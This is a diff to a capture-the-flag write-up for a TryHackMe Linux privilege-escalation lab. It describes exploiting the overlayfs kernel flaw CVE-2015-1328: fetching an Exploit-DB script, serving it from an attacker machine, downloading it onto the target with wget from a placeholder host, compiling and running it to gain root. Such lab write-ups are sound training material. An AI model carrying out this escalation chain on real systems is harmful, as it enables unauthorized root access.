@@ -43,7 +43,7 @@ Task 5 - Privilege Escalation: Kernel Exploits
 system.**
 
 At first, we check the username with whom we are logged in on the target machine, with
-`whoami` and I find out that we are indeed karen. It is our objective in this task, to
+`whoami` and I find out that we are indeed *karen*. It is our objective in this task, to
 gain *root* access without any knowledge of their credentials through a privilege
 escalation exploit. In this kernel exploit methodology, we first identify the kernel
 version, e.g. with `uname -a` which leads to the kernel version "3.13.0-24-generic",
@@ -51,24 +51,32 @@ same as before. We already searched for it in the Exploit Database [^2] and furt
 inform ourselves about the CVE "CVE-2015-1328" on the *National Vulnerability Database*
 (NVD) [^3]. Here, we find out this kernel version has a problem in the "overlayfs"
 implementation where Ubuntu does not properly check permissions for file creation in the
-upper filesystem directory.
-
-found flag in matt's home directory -> /home/matt/flag1.txt but can't open it without root privileges
-
-wget https://www.exploit-db.com/download/37292
-python3 -m http.server 8080
-
-find / -user karen 2> /dev/null
-/run/user/1001
-wget <ATTACK_BOX_IP_ADDRESS>:8080/ofs.c
-gcc ofs.c -o ofs
-id -> uid-1001(karen) gid=1001(karen) groups=1001(karen)
-./ofs -> Permission denied
-
-TBC
+upper filesystem directory. Next, we search for suitable exploits for the CVE "2015-1328"
+in the Exploit Database [^2] and are able to discover the *overlayfs* local privilege
+escalation script [^4] which we can download on our attacking machine with the command
+`wget https://www.exploit-db.com/download/37292`. Then, we proceed to save this file as
+`ofs.c` and send it to the target machine by setting up a server on our attacking machine
+with `python3 -m http.server 8080` and download it on the target machine with
+`wget <ATTACK_BOX_IP_ADDRESS>:8080/ofs.c`.
 
 **What is the content of the flag1.txt file?**
 
+However, we must first create a temporary directory in `/tmp/` because we are not 
+allowed to write to a new file in our missing home directory or anywhere else. Having 
+done this, we should have the exploit script in the temporary directory, and we can 
+compile it with `gcc ofs.c -o ofs`. Finally, we can execute it with `./ofs` which results
+in the following notifications.
+
+> spawning threads <br>
+> mount #1 <br>
+> mount #2 <br>
+> child threads done <br>
+> /etc/ld.so.preload created <br>
+> creating shared library <br>
+
+And indeed, with `whoami` we can find out, that we are *root* and we can thus read the
+contents of the `/home/matt/flag1.txt` file, which we already spotted earlier but were
+not able to view due to missing root privileges.
 
 Task 6 - Privilege Escalation: Sudo
 -----------------------------------------------------------------------------------------
@@ -94,3 +102,4 @@ Task 12 - Capstone Challenge
 [^1]: https://tryhackme.com/room/linprivesc
 [^2]: https://www.exploit-db.com/
 [^3]: https://nvd.nist.gov/vuln/detail/CVE-2015-1328
+[^4]: https://www.exploit-db.com/exploits/37292
